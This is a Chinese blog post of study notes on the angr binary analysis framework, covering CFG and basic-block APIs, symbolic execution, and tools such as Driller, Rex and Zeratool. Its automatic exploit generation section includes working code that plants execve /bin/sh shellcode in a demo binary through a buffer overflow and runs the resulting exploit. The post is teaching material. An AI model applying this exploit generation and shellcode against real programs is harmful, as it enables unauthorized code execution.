---
title: 符号执行相关-Angr
mathjax: true
date: 2020-06-25 10:57:49
categories:
- 符号执行
tags:
- angr
---

总结一下`angr`在静态分析、符号执行、fuzz和AEG（Automatic Exploit Generation，漏洞利用自动化）中的相关应用。

<!-- more -->

# Angr相关应用

## 静态分析

加载二进制文件并进行分析，相较于IDA（`Call`不为分割基本块的标准）、Clang（）等工具以函数为单位生成CFG图，Angr可以直接获取整个二进制文件的CFG图。

```py
binary = '/usr/bin/base64'
p = angr.Project(binary, auto_load_libs=False)
cfg = p.analyses.CFGFast() # 首选
# main = p.loader.main_object.get_symbol("main")
# cfg = p.analyses.CFGEmulated(fail_fast=True, starts=[main.rebased_addr])
p.entry
```

获取函数，`cfg.kb.functions`和`cfg.functions`功能一致。

```py
cfg.kb.functions.items() # 函数迭代器
f = cfg.kb.functions.get('main') # 根据函数名取函数
f = cfg.kb.functions.get_by_addr(0x402e10)

f.get_call_sites() # 函数中所有以call结尾的block地址
f.block_addrs # 函数所有基本块地址
f.size
f.name
```

获取基本块。

```py
f.blocks # 函数中所有block的迭代器，Angr的分析会丢掉一些block，必要时需要手动添加额外分析

cfg.graph.nodes() # 所有node的迭代器
node = cfg.get_node(0x403162) # 根据地址定位node
node.block # 获取node对应的block
node.successors # block所有的后续block（全局范围），递归遍历时注意陷入循环
node.predecessors
node.has_return # 包含ret

b.pp() # block对应的反汇编指令
b.instructions # 指令数量
b.capstone.insns[i].insn.insn_name() # 指令名称，如nop

# 检查block是否全为nop（用于对齐）
# all([blk.capstone.insns[i].insn.insn_name() == 'nop' for i in range(blk.instructions)])

b.size
b.addr
```

绘制CFG图（不推荐，耗时较长）。

```py
from angrutils import *
plot_cfg(cfg, "test", asminst=True, remove_imports=True, remove_path_terminator=True)
```

## 符号执行基础应用

参见[符号执行：利用Angr进行简单CTF逆向分析](https://www.freebuf.com/articles/web/150296.html)，利用程序输出特定字符串作为约束来求解对应程序输入。

注意Angr在遇到某些函数时不能正常工作，比如`_exit(0)`，而能正确处理`exit(0)`。

## AEG

[insomnihack_aeg](https://github.com/angr/angr-doc/tree/master/examples/insomnihack_aeg)，参考[基于 angr 的漏洞利用自动生成之缓冲区溢出案例分析](https://xz.aliyun.com/t/7199)。

- `demo_bin.c`：结构体中数组溢出覆盖函数指针
- `solve.py`：求解直接生成exploit（改动部分代码），覆盖PC为保存shellcode的地址

1. 初始化state和SIM。

```py
p = angr.Project(binary)
extras = {
    so.REVERSE_MEMORY_NAME_MAP, # 保留符号变量到内存地址的映射
    so.TRACK_ACTION_HISTORY # 保留路径上的state历史
}
es = p.factory.entry_state(add_options=extras) # 从入口点开始的state
sm = p.factory.simulation_manager(es, save_unconstrained=True) # 保存unconstrained state，即指令指针被用户数据或符号化数据控制
```

2. 寻找`PC`寄存器全部符号化（可被输入控制）的状态。

```py
exploitable_state = None
while exploitable_state is None:
    sm.step() # 执行一个基本块
    if len(sm.unconstrained) > 0:
        for u in sm.unconstrained:
            if all([u.solver.symbolic(u.regs.pc[i]) for i in range(u.arch.bits)]): # 该state中PC的每个bit均被符号化
                exploitable_state = u
                break
        sm.drop(stash='unconstrained')

ep = exploitable_state
```

3. 寻找一块可以存放shellcode的完全符号化内存空间，并建立全部约束。

```py
def find_symbolic_buffer(state, length):
    sym_addrs = [ ]
    for _, symbol in state.solver.get_variables('file', state.posix.stdin.ident): # 从state.posix.stdin.ident（'stdin'）寻找以file开头的符号化变量名?
        sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables)))) # 符号化变量对应的内存地址

    for addr in sym_addrs:
        if all([ (addr + i) in sym_addrs for i in range(length)]): # 确保连续空间
            yield addr

shellcode = bytes.fromhex("6a68682f2f2f73682f62696e89e331c96a0b5899cd80")
# from capstone import *
# for i in Cs(CS_ARCH_X86, CS_MODE_64).disasm(shellcode, 0):
#     print('0x{}:\t{}\t{}'.format(i.address, i.mnemonic, i.op_str))

# 0x0:    push    0x68          ;   h
# 0x2:    push    0x732f2f2f    ;   s///
# 0x7:    push    0x6e69622f    ;   nib/
# 0x12:   mov     ebx, esp      ;   ebx=/bin///sh
# 0x14:   xor     ecx, ecx      ;   ecx=0
# 0x16:   push    0xb
# 0x18:   pop     rax           ;   eax=sys_execve(11)
# 0x19:   cdq                   ;   edx=0
# 0x20:   int     0x80

for buf_addr in find_symbolic_buffer(ep, len(shellcode)):
    memory = ep.memory.load(buf_addr, len(shellcode)) # 从state.mem的buf_addr处取出len(shellcode)长度的内存
    sc_bvv = ep.solver.BVV(shellcode) # 转为bitvector

    # 添加约束并检查是否可解
    if ep.satisfiable(extra_constraints=(memory == sc_bvv, ep.regs.pc == buf_addr)):
        ep.add_constraints(memory == sc_bvv) # 正式添加约束
        ep.add_constraints(ep.regs.pc == buf_addr)
        break
```

4. 求解约束并将结果写入文件。

```py
with open(filename, 'wb') as f:
    f.write(ep.posix.dumps(0)) # 求解约束并从0（标准输入）处取出求解结果
```

5. 测试exploit，可以执行shell命令，其中`cat -`表示从标准输入读取。

```sh
(cat demo_bin-exploit; cat -) | ./demo_bin
```

## 参考资料

- [angr 系列教程(一）核心概念及模块解读](https://xz.aliyun.com/t/7117)

# 基于Angr的工具

## Driller

[Driller](https://github.com/shellphish/driller)是将符号执行和fuzz结合的第一个影响较大的工作，它依赖`afl-qemu`和`angr`对二进制文件进行分析，在`afl`遇到诸如`if`等检查时使用`angr`从当前样本出发进行符号执行，根据`missed state`求解产生新状态的输入，然后采用类似`slave`模式的方法将新样本合并到`master`中。其核心流程位于`driller_main.py`，逻辑非常接简洁，个人对其关键步骤做出了[注释](https://github.com/ZanderChang/myUtilities/blob/master/driller_main_analyse.py)。

类似工作：$Driller(2016) \rightarrow QSYM(2018) \rightarrow SAVIOR(2020)$，其中`QSYM`基于`kAFL`开发，同样依赖于`intel-pt`，`SAVIOR`目前未开源。

- [Driller的安装与使用](https://www.jianshu.com/p/6e3943474f41)

## Rex

将应用程序及导致应用程序崩溃的PoC作为系统输入，判断PoC的可利用性，自动生成Exploit并导出。

- [Rex: 自动化利用引擎分析](https://xz.aliyun.com/t/7179)
- [Rex：源码分析 -- Crash Analysis](https://ma3k4h3d.top/2019/01/23/rex-crash/)
- [Exploit自动生成引擎：Rex](https://www.freebuf.com/articles/system/197392.html)

## Zeratool

针对栈溢出漏洞和格式化字符串漏洞进行自动攻击。

（代码逻辑比较清晰，可以考虑fork出来用angr8来修补一遍）

- [zeratool：基于 angr 的CTF pwn 自动化利用工具介绍](https://xz.aliyun.com/t/7224)